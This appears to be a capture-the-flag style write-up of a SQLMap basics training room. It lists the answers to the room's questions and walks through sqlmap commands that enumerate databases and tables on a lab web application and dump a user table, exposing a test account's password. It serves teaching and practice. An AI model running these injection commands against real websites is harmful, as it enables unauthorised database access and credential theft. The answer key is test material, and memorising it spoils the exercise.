# SQLMap: The Basics

### Introduction
- Which language builds the interaction between a website and its database? `sql`

### SQL Injection Vulnerability
- Which boolean operator checks if at least one side of the operator is true for the condition to be true? `or`
- Is 1=1 in an SQL query always true? (YEA/NAY) `YEA`

### Automated SQL Injection Tool
- Which flag in the SQLMap tool is used to extract all the databases available? `--dbs`
- What would be the full command of SQLMap for extracting all tables from the "members" database? (Vulnerable URL: http://sqlmaptesting.thm/search/cat=1) `sqlmap -u http://sqlmaptesting.thm/search/cat=1 -D members --tables`

### Practical Exercise
- How many databases are available in this web application?<br />
First, run capture the request with burpsuite and save it on a `request` file. Then, run `sqlmap -r request --batch --level 5 --risk 3 -p email`. After it finishes, run `sqlmap -r request -p email --dbs`:<br />
![image](https://github.com/user-attachments/assets/5c84963f-e574-425b-a0fb-9060a65333ff)<br />
`6`
- What is the name of the table available in the "ai" database?<br />
Run `sqlmap -r request -p email -D ai --tables`: <br />
![image](https://github.com/user-attachments/assets/cb92f282-63d2-4d60-9df9-d53724fb8a19)<br />
`user`
- What is the password of the email test@chatai.com?<br />
Finally, run `sqlmap -r request -p email -D ai -T user --dump`:<br />
![image](https://github.com/user-attachments/assets/871787de-0145-4c04-b24a-7f9f41289c66)<br />
`12345678`
